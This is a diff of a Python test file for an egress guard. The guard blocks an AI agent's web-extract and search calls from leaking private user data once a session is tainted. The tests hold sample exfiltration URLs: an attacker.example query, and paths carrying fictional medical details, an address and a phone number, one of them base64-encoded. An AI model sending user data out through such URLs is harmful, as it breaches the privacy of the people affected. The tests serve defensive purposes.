@@ -179,9 +179,10 @@ def _rec(*, search_hosts=(), timely=(), tainted=(), urls=()):
     return rec
 
 
-def _check(tool, args, *, tainted=True, person_hosts=(), rec=None, memory=(USER,), private=()):
+def _check(tool, args, *, tainted=True, person_hosts=(), rec=None, memory=(USER,), private=(), person_links=()):
     return egress.check(tool, args, tainted=tainted, person_hosts=person_hosts, rec=rec or _rec(timely=[NOTES]),
-                        memory=memory, private=private, browser_urls=lambda a: egress.urls_in(json.dumps(a)))
+                        memory=memory, private=private, browser_urls=lambda a: egress.urls_in(json.dumps(a)),
+                        person_links=person_links)
 
 
 def test_clean_session_is_not_restricted():
@@ -192,8 +193,9 @@ def test_clean_session_is_not_restricted():
 def test_extract_after_taint_needs_a_person_or_search_result_host():
     blocked = _check("web_extract", {"urls": ["https://attacker.example/?q=hello"]})
     assert blocked and egress.PASTE_LINK in blocked and "attacker.example" in blocked
-    assert _check("web_extract", {"urls": ["https://www.Shop.Example./deal"]}, person_hosts=["shop.example"]) is None
-    rec = _rec(search_hosts={"news.example"}, timely=[NOTES])
+    assert _check("web_extract", {"urls": ["https://www.Shop.Example./deal"]}, person_hosts=["shop.example"],
+                  person_links=["shop.example/deal"]) is None
+    rec = _rec(search_hosts={"news.example"}, timely=[NOTES], urls={"https://news.example/a"})
     assert _check("web_extract", {"urls": [{"url": "https://news.example/a"}]}, rec=rec) is None
     # a subdomain of an allowed host is another host; one bad URL blocks the call
     assert _check("web_extract", {"urls": ["https://evil.news.example/a"]}, rec=rec)
@@ -205,10 +207,47 @@ def test_extract_after_taint_needs_a_person_or_search_result_host():
 def test_extract_url_to_an_allowed_host_carrying_private_text_is_blocked():
     rec = _rec(search_hosts={"news.example"}, timely=[NOTES], urls={"https://news.example/project-falcon-budget-48-000"})
     url = "https://news.example/?q=" + "Project%20Falcon%20budget%20is%2048%2C000%20dollars"
-    assert _check("web_extract", {"urls": [url]}, rec=rec) == egress.URL_TEXT_BLOCKED
-    assert _check("web_extract", {"urls": ["https://news.example/?q=555-0142"]}, rec=rec) == egress.URL_TEXT_BLOCKED
+    assert _check("web_extract", {"urls": [url]}, rec=rec) == egress.PAGE_BLOCKED
+    assert _check("web_extract", {"urls": ["https://news.example/?q=555-0142"]}, rec=rec) == egress.PAGE_BLOCKED
     # the same words in a URL the search itself returned pass
     assert _check("web_extract", {"urls": ["https://news.example/project-falcon-budget-48-000"]}, rec=rec) is None
+
+
+@pytest.mark.parametrize("path", [
+    "/x/okonkwo-fertility", "/x/dana-whitfield", "/x/5550142",
+    "/x/SVZGIGNvbnN1bHQgd2l0aCBEci4gT2tvbmt3byBhdCBSaXZlcnNpZGUgRmVydGlsaXR5IENsaW5pYw",
+    "/c/halvorsen-biotech-ingrid", "/?q=okonkwo", "/#dana",
+])
+def test_extract_after_taint_opens_only_typed_searched_or_front_pages(path):
+    """Short or encoded data in a page path on an allowed host is not caught by matching words, so
+    after taint only a front page, a link the person typed or a search's own result opens. The same
+    rule holds for every backend (a saved Exa, Firecrawl or Parallel key, whose reads Go never sees)."""
+    private = ["IVF consult with Dr. Okonkwo at Riverside Fertility Clinic"]
+    memory = ["Dana Whitfield lives at 48 Elm Street. Phone 555-0142."]
+    rec = _rec(timely=[])
+    url = "https://news.example" + path
+    assert _check("web_extract", {"urls": [url]}, rec=rec, person_hosts=["news.example"], private=private,
+                  memory=memory) == egress.PAGE_BLOCKED
+
+
+def test_extract_after_taint_front_page_typed_link_and_search_result_open():
+    rec = _rec(search_hosts={"found.example"}, urls={"https://found.example/a?id=7"})
+    links = ["typed.example/docs/intro", "typed.example/?q=mine", "https://bot.example/feed"]
+    hosts = ["typed.example", "bot.example"]
+    for url in ("https://typed.example", "https://typed.example/", "https://www.typed.example/docs/intro",
+                "https://typed.example/docs", "https://typed.example/?q=mine", "https://bot.example/feed",
+                "https://found.example/a?id=7", "https://found.example/"):
+        assert _check("web_extract", {"urls": [url]}, rec=rec, person_hosts=hosts, person_links=links) is None, url
+    for url in ("https://typed.example/docs/intro/extra", "https://typed.example/docs-x", "https://typed.example/?q=other",
+                "https://found.example/a?id=8", "https://found.example/b", "https://bot.example/feed/x"):
+        assert _check("web_extract", {"urls": [url]}, rec=rec, person_hosts=hosts,
+                      person_links=links) == egress.PAGE_BLOCKED, url
+
+
+def test_search_result_urls_are_read_from_json_values():
+    part = egress.Part()
+    part.add_search(json.dumps({"results": [{"url": "https://a.example/p?x=1&y=2"}]}).replace("&", "\\u0026"))
+    assert part.search_urls == {"https://a.example/p?x=1&y=2"}
 
 
 def test_browser_urls_follow_the_host_rule():
@@ -302,7 +341,7 @@ def test_this_turns_get_context_is_private():
                   private=[CONTEXT]) == egress.SEARCH_BLOCKED
     path = "https://news.example/log/ivf-consult-okonkwo-riverside-fertility-clinic"
     assert _check("web_extract", {"urls": [path]}, rec=rec, person_hosts=["news.example"],
-                  private=[CONTEXT]) == egress.URL_TEXT_BLOCKED
+                  private=[CONTEXT]) == egress.PAGE_BLOCKED
     # without the context nothing ties the words to the person
     assert _check("web_search", {"query": "IVF consult Dr Okonkwo Riverside Fertility Clinic"}, rec=rec) is None
     # the prefix's own words are Timely's, not data
